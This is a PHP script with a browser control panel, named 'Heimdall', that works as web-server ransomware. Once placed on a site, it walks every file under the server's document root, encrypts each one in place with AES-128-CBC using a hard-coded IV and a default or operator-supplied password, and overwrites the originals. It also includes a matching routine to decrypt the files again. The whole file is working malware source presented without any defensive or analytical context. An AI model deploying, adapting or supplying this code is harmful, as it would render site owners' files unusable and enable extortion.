<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 17/10/16
 * Time: 18:55
 */

ini_set('memory_limit','-1');
ini_set('max_execution_time', 0);

if(isset($_POST['action'])){

    $heimdall= new Heimdall();
    $heimdall->setPassword($_POST['password']);
    switch ($_POST['action']) {
        case 'cryptography':
            $result=$heimdall->cryptographyByUrl($_POST['NumberInit'],$_POST['NumberFinish']);
            break;
        case 'descryptography':
            $result=$heimdall->descryptographyByUrl($_POST['NumberInit'],$_POST['NumberFinish']);
            break;

    }
    echo json_encode($result);
    exit();
}

?>

    <html>
    <head>
        <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
        <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
        <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
        <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
        <script>

            $(document).ready(function() {
                $('#table1').DataTable();
                function sendData(action,password,NumberInit,NumberFinish){
                    $.ajax({
                        type: "post",
                        data: {
                            action: action,
                            password: password,
                            NumberInit:NumberInit,
                            NumberFinish:NumberFinish,
                        },
                        success: function (data) {

                            var dataArr = JSON.parse(data);
                            $.each(dataArr, function(index,item) {
                                if(item.status=="encrypted" || item.status=="decrypted fail" ){
                                    $('#numberFilesCrypted').html(parseInt($('#numberFilesCrypted').html())+1);
                                }
                                if(item.status=="edit file fail" || item.status=="decrypted" || item.status=="encrypted fail"){
                                    $('#numberFilesDecrypted').html(parseInt($('#numberFilesDecrypted').html())+1);
                                }
                                if($('#totalOfResults').html().trim()<=5000){
                                    if(item.status=="encrypted" || item.status=="decrypted fail" ){
                                        css='text-red';
                                    }
                                    if(item.status=="edit file fail" || item.status=="decrypted"){
                                        css='text-blue';
                                    }
                                    if(item.status=="encrypted fail" ){
                                        css='text-green';
                                    }
                                    $('#table tr:last').after(
                                        '<tr>' +
                                        '<td>'+index+'</td>' +
                                        '<td>'+item.url+'</td>' +
                                        '<td class="'+css+'">'+item.status+'</td>' +
                                        '</tr>');
                                }else{
                                    $('.message-blue').html('The structure is very big, why this we dont will show details');
                                }

                                loading(index);
                            });


                        }
                    });
                }

                $('#sendPass').click(function (){
                    clearMessage();
                    if($('#password').val()!="") {
                        prepareSendData('cryptography',$('#password').val());

                    }else{
                        $('.message-red').html('insert your password for cryptography');
                    }

                });
                $('#sendDePass').click(function (){
                    clearMessage();
                    if($('#passwordDecrypt').val()!="") {
                        prepareSendData('descryptography',$('#passwordDecrypt').val());
                    }else{

                        $('.message-blue').html('insert your password for decrypt');
                    }
                });

                function prepareSendData(action,password){
                    var collection = [];
                    var totalResultsForRequest = 500;

                    for ( var i = totalResultsForRequest; i <= $('#totalOfResults').html().trim(); i=i+totalResultsForRequest ) {
                        collection.push(i);
                    };
                    collection.push(i+($('#totalOfResults').html().trim()-i));
                    iTime = 1;
                    for(var i in collection) {
                        setTimeout(function () {
                            var j = collection.shift();
                            sendData(action, password,j-totalResultsForRequest ,j);
                        }, 2000 * iTime);
                        iTime++;
                    }
                    $('.message-green').html('Action finished!!');
                }

                function clearMessage(){
                    $('.message-blue').html('');
                    $('.message-red').html('');
                }

                function loading(partial){
                    total = $('#totalOfResults').html();
                    p = Math.ceil((partial/total)*100);
                    $(".progress").css("max-width",p+"%");
                    $(".progress-view").text(p+"%");
                }
            });

        </script>
        <style>
            .text-red{
                color:red;
            }
            .text-blue{
                color:blue;
            }
            .text-green{
                color:green;
            }
            .progress{
                background:orchid;
            }
            .progress-view{
                color:white;
            }
        </style>
    </head>

    <body>
    <?php

    ini_set('display_errors',1);
    ini_set('display_startup_erros',1);
    error_reporting(E_ALL);


    $heimdall = new Heimdall();
    ?>
    <fieldset>
        <legend>
            Heimdall Encrypted
        </legend>
        <form id="formCriptography">
            <label>Password for encrypted</label>
            <input type="text" name="password" id="password">
            <input type="button" value="Send" id="sendPass">
        </form>
    </fieldset>

    <fieldset>
        <legend>
            Heimdall Decrypted
        </legend>
        <form id="formDecriptography">
            <label>Password for decrypted</label>
            <input type="text" name="passwordDecrypt" id="passwordDecrypt">
            <input type="button" value="Send" id="sendDePass">
        </form>
    </fieldset>
    <fieldset id="message">
        <legend>Message</legend>
        <div class="message-blue text-blue">

        </div>
        <div class="message-red text-red">

        </div>

    </fieldset>

    <fieldset>
        <legend>
            Resume
        </legend>
        <div class="numberFiles">
            <?php
            //list of files
            $arrList=$heimdall->getDirContents($_SERVER['DOCUMENT_ROOT']);
            echo "Total of <span id='totalOfResults'>".count($arrList)."</span> files<br>";
            ?>
        </div>
        <div class="numberFiles">
            <label>Files cryptography: </label><span id="numberFilesCrypted">0</span>
        </div>
        <div class="numberFiles">
            <label>Files decryptography: </label><span id="numberFilesDecrypted">0</span>
        </div>
        <div class="progress">
            <div class="progress-view">

            </div>
        </div>
        <table id="table" class="display" cellspacing="0" width="100%">
            <thead>
            <tr>
                <th>
                    Number
                </th>
                <th>
                    Path/File
                </th>
                <th>
                    Status
                </th>
            </tr>
            </thead>
            <tbody>
            </tbody>
        </table>

    </fieldset>

    </body>
    </html>
<?php




//class Heimdall
class Heimdall{

    public $algorithm;
    public $password;
    public $IV;

    public function __construct()
    {
        $this->algorithm='AES-128-CBC';
        $this->IV='Gj4LL4rH0rn0nL33';
        $this->password='HeimdallF0r4ll';
    }

    public function setPassword($password)
    {
        $this->password = $password;
    }

    public function cryptography($text){
        return "Heimdall---".openssl_encrypt($text, $this->algorithm, $this->password, 0, $this->IV);
    }

    public function descryptography($hash){
        $arrHash=explode("Heimdall---",$hash);
        return openssl_decrypt($arrHash[1], $this->algorithm, $this->password, 0, $this->IV);
    }

    public function getDirContents($dir, &$results = array()){
        $files = scandir($dir);

        foreach($files as $key => $value){
            $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
            //Check size of files, read only < 9 mb
            if(filesize($path)<=10000000){
                if(!is_dir($path)) {
                    $results[] = $path;
                } else if($value != "." && $value != "..") {
                    self::getDirContents($path, $results);
                    //$results[] = $path;
                }
            }

        }

        return $results;
    }

    public function readFile($url){
        return file_get_contents($url);
    }

    public function cryptographyByUrl($numberInit,$umberFinish){
        $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
        $result=array();
        for ($i = $numberInit; $i<= $umberFinish ; $i++) {
            $url=$files[$i];
            $file = $this->readFile($url);
            $fileCriptgrafy= $this->cryptography("<!-- Heimdall Decryptography Success -->".$file);
            $arrSignature=explode("Heimdall---",$fileCriptgrafy);
            $result[$i]['url']=$url;
            if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){

                if($this->editFile($url,$fileCriptgrafy)){

                    $result[$i]['status']="encrypted";
                }else{
                    $result[$i]['status']="edit file fail";
                }

            }else{
                $result[$i]['status']="encrypted fail";
            }
        }
        return $result;


    }

    public function descryptographyByUrl($numberInit,$umberFinish){
        $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
        $result=array();
        for ($i = $numberInit; $i<= $umberFinish ; $i++) {
            $url=$files[$i];
            $file = $this->readFile($url);
            $arrSignature=explode("Heimdall---",$file);
            $result[$i]['url']=$url;
            if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){
                $fileDesCriptgrafy= $this->descryptography($file);
                if($this->checkIfDecrypt($fileDesCriptgrafy)){
                    if($this->editFile($url,$fileDesCriptgrafy)){
                        $result[$i]['status']= "decrypted";
                    }else{
                        $result[$i]['status']="edit file fail";
                    }
                }else{
                    $result[$i]['status']= "decrypted fail1";
                }
            }else{
                $result[$i]['status']= "decrypted fail2";
            }
        }
        return $result;

    }

    private function checkIfDecrypt($file){
        $validXmlrpc = preg_match("/<!-- Heimdall Decryptography Success -->(.*)/", $file, $matches, PREG_OFFSET_CAPTURE);
        if($validXmlrpc){
            return true;
        }
        return false;
    }

    private function editFile($url,$content){
        try{
            return file_put_contents($url,$content);
        }catch(Exception $e){
            return false;
        }

    }

    public function checkIfIsCriptograpfy($url){
        $file = $this->readFile($url);
        $arrSignature=explode("Heimdall---",$file);
        if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){
            return true;
        }
        return false;
    }
    private function getMemoryLimit(){
        $memory_limit = ini_get('memory_limit');
        if (preg_match('/^(\d+)(.)$/', $memory_limit, $matches)) {
            if ($matches[2] == 'M') {
                $memory_limit = $matches[1] * 1024 * 1024; // nnnM -> nnn MB
            } else if ($matches[2] == 'K') {
                $memory_limit = $matches[1] * 1024; // nnnK -> nnn KB
            }
        }
    }

    private function getMemoryUsing(){
        return memory_get_usage();
    }
}
